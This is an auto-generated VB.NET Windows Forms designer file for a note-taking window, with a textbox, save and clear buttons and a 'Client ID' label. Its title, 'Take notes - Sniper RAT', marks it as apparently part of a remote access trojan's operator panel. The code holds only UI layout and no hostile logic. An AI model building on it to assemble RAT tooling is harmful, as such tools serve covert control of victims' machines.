<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmNotes
    Inherits System.Windows.Forms.Form

    'Form esegue l'override del metodo Dispose per pulire l'elenco dei componenti.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Richiesto da Progettazione Windows Form
    Private components As System.ComponentModel.IContainer

    'NOTA: la procedura che segue è richiesta da Progettazione Windows Form
    'Può essere modificata in Progettazione Windows Form.  
    'Non modificarla nell'editor del codice.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmNotes))
        Me.txtNotes = New System.Windows.Forms.TextBox()
        Me.picNotes = New System.Windows.Forms.PictureBox()
        Me.cmdClear = New System.Windows.Forms.Button()
        Me.cmdSave = New System.Windows.Forms.Button()
        Me.lblCl = New System.Windows.Forms.Label()
        Me.lblclidb = New System.Windows.Forms.Label()
        CType(Me.picNotes, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'txtNotes
        '
        Me.txtNotes.Location = New System.Drawing.Point(12, 61)
        Me.txtNotes.Multiline = True
        Me.txtNotes.Name = "txtNotes"
        Me.txtNotes.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtNotes.Size = New System.Drawing.Size(346, 243)
        Me.txtNotes.TabIndex = 0
        '
        'picNotes
        '
        Me.picNotes.Image = Global.Sniper.My.Resources.Resources._1300126724_notebook_boy1
        Me.picNotes.Location = New System.Drawing.Point(306, 12)
        Me.picNotes.Name = "picNotes"
        Me.picNotes.Size = New System.Drawing.Size(52, 43)
        Me.picNotes.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picNotes.TabIndex = 3
        Me.picNotes.TabStop = False
        '
        'cmdClear
        '
        Me.cmdClear.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.cmdClear.Image = Global.Sniper.My.Resources.Resources._1300127188_edit_clear
        Me.cmdClear.Location = New System.Drawing.Point(93, 12)
        Me.cmdClear.Name = "cmdClear"
        Me.cmdClear.Size = New System.Drawing.Size(75, 43)
        Me.cmdClear.TabIndex = 2
        Me.cmdClear.UseVisualStyleBackColor = True
        '
        'cmdSave
        '
        Me.cmdSave.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.cmdSave.Image = Global.Sniper.My.Resources.Resources._1300127122_3floppy_unmount
        Me.cmdSave.Location = New System.Drawing.Point(12, 12)
        Me.cmdSave.Name = "cmdSave"
        Me.cmdSave.Size = New System.Drawing.Size(75, 43)
        Me.cmdSave.TabIndex = 1
        Me.cmdSave.UseVisualStyleBackColor = True
        '
        'lblCl
        '
        Me.lblCl.AutoSize = True
        Me.lblCl.Location = New System.Drawing.Point(174, 42)
        Me.lblCl.Name = "lblCl"
        Me.lblCl.Size = New System.Drawing.Size(13, 13)
        Me.lblCl.TabIndex = 4
        Me.lblCl.Text = "0"
        '
        'lblclidb
        '
        Me.lblclidb.AutoSize = True
        Me.lblclidb.Location = New System.Drawing.Point(175, 13)
        Me.lblclidb.Name = "lblclidb"
        Me.lblclidb.Size = New System.Drawing.Size(50, 13)
        Me.lblclidb.TabIndex = 5
        Me.lblclidb.Text = "Client ID:"
        '
        'frmNotes
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(371, 314)
        Me.Controls.Add(Me.lblclidb)
        Me.Controls.Add(Me.lblCl)
        Me.Controls.Add(Me.picNotes)
        Me.Controls.Add(Me.cmdClear)
        Me.Controls.Add(Me.cmdSave)
        Me.Controls.Add(Me.txtNotes)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "frmNotes"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Take notes - Sniper RAT"
        CType(Me.picNotes, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents txtNotes As System.Windows.Forms.TextBox
    Friend WithEvents cmdSave As System.Windows.Forms.Button
    Friend WithEvents cmdClear As System.Windows.Forms.Button
    Friend WithEvents picNotes As System.Windows.Forms.PictureBox
    Friend WithEvents lblCl As System.Windows.Forms.Label
    Friend WithEvents lblclidb As System.Windows.Forms.Label
End Class
